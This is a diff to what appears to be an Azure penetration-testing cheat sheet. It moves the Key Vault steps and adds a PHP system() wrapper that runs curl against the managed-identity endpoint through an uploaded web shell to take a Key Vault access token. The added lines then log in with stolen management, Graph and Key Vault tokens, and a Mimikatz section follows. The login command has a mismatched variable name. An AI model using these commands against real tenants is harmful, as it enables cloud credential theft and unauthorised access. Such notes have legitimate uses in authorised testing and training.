@@ -324,19 +324,6 @@ az account get-access-token --resource-type ms-graph
 ```
 
 ### Keyvault
-#### Get keyvault access token
-```
-curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
-```
-
-### Login to account with access tokens for keyvault
-```
-$accesstoken = ''
-$keyvaulttoken = ``
-
-Connect-AzAccount -AccessToken $accesstoken -AccountId <ID> -KeyVaultAccessToken $keyvaulttoken
-```
-
 #### List all keyvaults
 ```
 Get-AzKeyVault
@@ -363,6 +350,24 @@ $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)
 
 Connect-AzAccount -Credential $creds
+```
+
+#### Get keyvault access token
+```
+<?php
+ system('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+?>
+```
+
+#### Login to account with access tokens for keyvault
+- Uses access tokens `mgmtToken` and `graphToken` from [shell upload](initial-access-attacks.md#use-access-tokens-to-connect-with-az-module)
+```
+$mgmtToken = <TOKEN>
+$graphToken = <TOKEN>
+$keyvaultToken = <TOKEN>
+
+Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graphToken -KeyVaultAccessToken $keyvault -AccountId
+8d8bb307-40ab-4eef-ba08-6b40584cd179
 ```
 
 ### Mimikatz
